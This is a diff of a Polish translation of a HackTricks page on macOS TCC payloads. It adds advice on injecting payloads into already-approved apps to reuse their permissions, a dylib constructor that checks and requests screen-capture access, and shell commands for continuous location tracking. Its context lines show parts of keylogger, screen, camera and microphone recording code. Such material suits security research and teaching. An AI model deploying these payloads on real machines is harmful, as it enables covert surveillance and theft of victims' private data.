@@ -1,10 +1,18 @@
-# macOS TCC Payloads
+# Payloady macOS TCC
 
 {{#include ../../../../banners/hacktricks-training.md}}
 
+> [!TIP]
+> Decyzje TCC są powiązane z **tożsamością procesu** żądającego zasobu. W post-exploitation zwykle celem jest **wstrzyknięcie tych payloadów do już zatwierdzonej aplikacji** (albo uruchomienie ich w jej bundle / kontekście podpisu) zamiast uruchamiania nowego helpera, który wywoła własny prompt.
+>
+> Dla **Screen Recording**, **Input Monitoring** i **synthetic input**, nowoczesny macOS udostępnia też jawne API preflight / request, takie jak `CGPreflightScreenCaptureAccess`, `CGRequestScreenCaptureAccess`, `CGRequestListenEventAccess` i `CGRequestPostEventAccess`.
+
+> [!WARNING]
+> To nadal bardzo realistyczna ścieżka ataku: niedawne badania nad kradzieżą uprawnień w aplikacjach Microsoft na macOS pokazały, że **słaba walidacja bibliotek / ładowanie pluginów** może pozwolić atakującemu ponownie użyć już nadanych aplikacji ofiary uprawnień **camera**, **microphone** i innych TCC bez drugiego promptu.
+
 ### Desktop
 
-- **Entitlement**: Brak
+- **Entitlement**: None
 - **TCC**: kTCCServiceSystemPolicyDesktopFolder
 
 {{#tabs}}
@@ -51,9 +59,9 @@ cp -r "$HOME/Desktop" "/tmp/desktop"
 {{#endtab}}
 {{#endtabs}}
 
-### Dokumenty
+### Documents
 
-- **Uprawnienia**: Brak
+- **Entitlement**: None
 - **TCC**: `kTCCServiceSystemPolicyDocumentsFolder`
 
 {{#tabs}}
@@ -100,9 +108,9 @@ cp -r "$HOME/Documents" "/tmp/documents"
 {{#endtab}}
 {{#endtabs}}
 
-### Pobrania
+### Pobrane pliki
 
-- **Uprawnienia**: Brak
+- **Entitlement**: None
 - **TCC**: `kTCCServiceSystemPolicyDownloadsFolder`
 
 {{#tabs}}
@@ -149,9 +157,9 @@ cp -r "$HOME/Downloads" "/tmp/downloads"
 {{#endtab}}
 {{#endtabs}}
 
-### Biblioteka zdjęć
+### Librarya Photos
 
-- **Uprawnienie**: `com.apple.security.personal-information.photos-library`
+- **Entitlement**: `com.apple.security.personal-information.photos-library`
 - **TCC**: `kTCCServicePhotos`
 
 {{#tabs}}
@@ -200,7 +208,7 @@ cp -r "$HOME/Pictures/Photos Library.photoslibrary" "/tmp/photos"
 
 ### Kontakty
 
-- **Uprawnienie**: `com.apple.security.personal-information.addressbook`
+- **Entitlement**: `com.apple.security.personal-information.addressbook`
 - **TCC**: `kTCCServiceAddressBook`
 
 {{#tabs}}
@@ -247,9 +255,9 @@ cp -r "$HOME/Library/Application Support/AddressBook" "/tmp/contacts"
 {{#endtab}}
 {{#endtabs}}
 
-### Kalendarz
+### Calendar
 
-- **Uprawnienie**: `com.apple.security.personal-information.calendars`
+- **Entitlement**: `com.apple.security.personal-information.calendars`
 - **TCC**: `kTCCServiceCalendar`
 
 {{#tabs}}
@@ -296,13 +304,13 @@ cp -r "$HOME/Library/Calendars" "/tmp/calendars"
 {{#endtab}}
 {{#endtabs}}
 
-### Kamera
+### Camera
 
-- **Uprawnienie**: `com.apple.security.device.camera`
+- **Entitlement**: `com.apple.security.device.camera`
 - **TCC**: `kTCCServiceCamera`
 
 {{#tabs}}
-{{#tab name="ObjetiveC - Nagraj"}}
+{{#tab name="ObjetiveC - Record"}}
 Nagraj 3-sekundowe wideo i zapisz je w **`/tmp/recording.mov`**
 ```objectivec
 #import <Foundation/Foundation.h>
@@ -424,12 +432,12 @@ ffmpeg -framerate 30 -f avfoundation -i "0" -frames:v 1 /tmp/capture.jpg
 
 ### Mikrofon
 
-- **Uprawnienie**: **com.apple.security.device.audio-input**
+- **Entitlement**: **com.apple.security.device.audio-input**
 - **TCC**: `kTCCServiceMicrophone`
 
 {{#tabs}}
-{{#tab name="ObjetiveC - Nagraj"}}
-Nagraj 5s audio i zapisz je w `/tmp/recording.m4a`
+{{#tab name="ObjetiveC - Record"}}
+Nagraj 5 s audio i zapisz je w `/tmp/recording.m4a`
 ```objectivec
 #import <Foundation/Foundation.h>
 #import <AVFoundation/AVFoundation.h>
@@ -560,7 +568,7 @@ static void telegram(int argc, const char **argv) {
 {{#endtab}}
 
 {{#tab name="Shell"}}
-Nagraj 5-sekundowy dźwięk i zapisz go w `/tmp/recording.wav`
+Nagraj 5 s audio i zapisz go w `/tmp/recording.wav`
 ```bash
 # Check the microphones
 ffmpeg -f avfoundation -list_devices true -i ""
@@ -570,13 +578,13 @@ ffmpeg -f avfoundation -i ":1" -t 5 /tmp/recording.wav
 {{#endtab}}
 {{#endtabs}}
 
-### Lokalizacja
+### Location
 
 > [!TIP]
-> Aby aplikacja mogła uzyskać lokalizację, **Usługi lokalizacji** (z Prywatności i bezpieczeństwa) **muszą być włączone,** w przeciwnym razie nie będzie mogła uzyskać do niej dostępu.
+> Aby aplikacja mogła uzyskać dostęp do lokalizacji, **Location Services** (w Privacy & Security) **muszą być włączone,** w przeciwnym razie nie będzie mogła z nich korzystać.
 
-- **Uprawnienie**: `com.apple.security.personal-information.location`
-- **TCC**: Przyznane w `/var/db/locationd/clients.plist`
+- **Entitlement**: `com.apple.security.personal-information.location`
+- **TCC**: Przyznawane w `/var/db/locationd/clients.plist`
 
 {{#tabs}}
 {{#tab name="ObjectiveC"}}
@@ -630,21 +638,29 @@ freopen("/tmp/logs.txt", "w", stderr); // Redirect stderr to /tmp/logs.txt
 {{#endtab}}
 
 {{#tab name="Shell"}}
-Uzyskaj dostęp do lokalizacji
+Pobierz bieżącą lokalizację z shell.
+```bash
+# Fast option: use a dedicated CoreLocation CLI helper
+brew install --cask corelocationcli
+CoreLocationCLI --json
+
+# Keep printing updates while the device moves
+CoreLocationCLI --watch --format '%latitude %longitude %speed %time'
 ```
-???
-```
+> [!TIP]
+> To nadal zależy od włączonych **Location Services** oraz od uzyskania przez narzędzie / terminal zgody TCC. `CoreLocationCLI` również opiera się w większości Maców na pozycjonowaniu wspomaganym przez Wi‑Fi, więc wyłączone Wi‑Fi często kończy się `kCLErrorDomain error 0`.
+
 {{#endtab}}
 {{#endtabs}}
 
-### Nagrywanie ekranu
+### Screen Recording
 
-- **Uprawnienia**: Brak
+- **Entitlement**: None
 - **TCC**: `kTCCServiceScreenCapture`
 
 {{#tabs}}
 {{#tab name="ObjectiveC"}}
-Nagraj główny ekran przez 5s w `/tmp/screen.mov`
+Nagraj główny ekran przez 5 s do `/tmp/screen.mov`
 ```objectivec
 #import <Foundation/Foundation.h>
 #import <AVFoundation/AVFoundation.h>
@@ -672,6 +688,7 @@ exit(0);
 
 __attribute__((constructor))
 void myconstructor(int argc, const char **argv)
+{
 freopen("/tmp/logs.txt", "w", stderr); // Redirect stderr to /tmp/logs.txt
 AVCaptureSession *captureSession = [[AVCaptureSession alloc] init];
 AVCaptureScreenInput *screenInput = [[AVCaptureScreenInput alloc] initWithDisplayID:CGMainDisplayID()];
@@ -700,23 +717,47 @@ freopen("/tmp/logs.txt", "w", stderr); // Redirect stderr to /tmp/logs.txt
 ```
 {{#endtab}}
 
+{{#tab name="ObjectiveC - Check / Prompt"}}
+Sprawdź, czy bieżący proces może przechwytywać ekran i wywołaj prompt TCC, jeśli to potrzebne.
+```objectivec
+#import <Foundation/Foundation.h>
+#import <CoreGraphics/CoreGraphics.h>
+
+// clang -framework Foundation -framework CoreGraphics -dynamiclib ScreenCheck.m -o ScreenCheck.dylib
+
+__attribute__((constructor))
+static void screencheck(int argc, const char **argv) {
+freopen("/tmp/logs.txt", "a", stderr);
+BOOL allowed = CGPreflightScreenCaptureAccess();
+if (!allowed) {
+allowed = CGRequestScreenCaptureAccess();
+}
+NSLog(@"Screen capture access: %@", allowed ? @"granted" : @"denied");
+fclose(stderr);
+}
+```
+{{#endtab}}
+
 {{#tab name="Shell"}}
-Nagraj główny ekran przez 5s
+Nagraj główny ekran przez 5 s
 ```bash
 screencapture -V 5 /tmp/screen.mov
 ```
 {{#endtab}}
 {{#endtabs}}
 
-### Dostępność
+> [!TIP]
+> Na **macOS 12.3+**, `ScreenCaptureKit` zwykle jest lepszą post-exploitation primitive niż `AVCaptureScreenInput`: może robić streaming o wysokiej wydajności, pobieranie pojedynczych klatek z `SCScreenshotManager` oraz streamować **system audio**. Jeśli chcesz też audio z **microphone**, nadal potrzebujesz `kTCCServiceMicrophone`. Więcej primitives do abuse desktop-session znajdziesz na [tej powiązanej stronie](../macos-input-monitoring-screen-capture-accessibility.md).
 
-- **Uprawnienie**: Brak
+### Accessibility
+
+- **Entitlement**: None
 - **TCC**: `kTCCServiceAccessibility`
 
-Użyj uprawnienia TCC, aby zaakceptować kontrolę nad Finderem, naciskając enter i w ten sposób obejść TCC
+Użyj uprawnienia TCC, aby zaakceptować kontrolę nad Finder przez naciśnięcie enter i w ten sposób ominąć TCC
 
 {{#tabs}}
-{{#tab name="Akceptuj TCC"}}
+{{#tab name="Accept TCC"}}
 ```objectivec
 #import <Foundation/Foundation.h>
 #import <ApplicationServices/ApplicationServices.h>
@@ -770,7 +811,7 @@ return 0;
 {{#endtab}}
 
 {{#tab name="Keylogger"}}
-Zapisz naciśnięte klawisze w **`/tmp/keystrokes.txt`**
+Przechowuj naciśnięte klawisze w **`/tmp/keystrokes.txt`**
 ```objectivec
 #import <Foundation/Foundation.h>
 #import <ApplicationServices/ApplicationServices.h>
@@ -877,6 +918,17 @@ return 0;
 {{#endtab}}
 {{#endtabs}}
 
-> [!CAUTION] > **Dostępność to bardzo potężne uprawnienie**, możesz je nadużyć na inne sposoby, na przykład możesz przeprowadzić **atak na naciśnięcia klawiszy** tylko z tego, bez potrzeby wywoływania System Events.
+> [!CAUTION] > **Accessibility jest bardzo potężnym uprawnieniem**, możesz nadużyć go także w inny sposób, na przykład możesz przeprowadzić **keystrokes attack** tylko dzięki niemu, bez potrzeby wywoływania System Events.
+
+> [!TIP]
+> Nowsze wersje macOS rozdzielają również nadużycie desktop-session na **Input Monitoring** (`kTCCServiceListenEvent`) oraz **synthetic input** (`kTCCServicePostEvent`). Jeśli potrzebujesz keylogging, screen grabs lub raw event injection zamiast automatyzacji AXUIElement, sprawdź [macOS Input Monitoring, Screen Capture & Accessibility Abuse](../macos-input-monitoring-screen-capture-accessibility.md).
+
+
+
+## References
+
+- [Cisco Talos - How multiple vulnerabilities in Microsoft apps for macOS pave the way to stealing permissions](https://blog.talosintelligence.com/how_multiple_vulnerabilities_in_Microsoft_apps_for_macos_pave_the_way_to_stealing_permissions/)
+- [CoreLocationCLI](https://github.com/fulldecent/corelocationcli)
+
 
 {{#include ../../../../banners/hacktricks-training.md}}
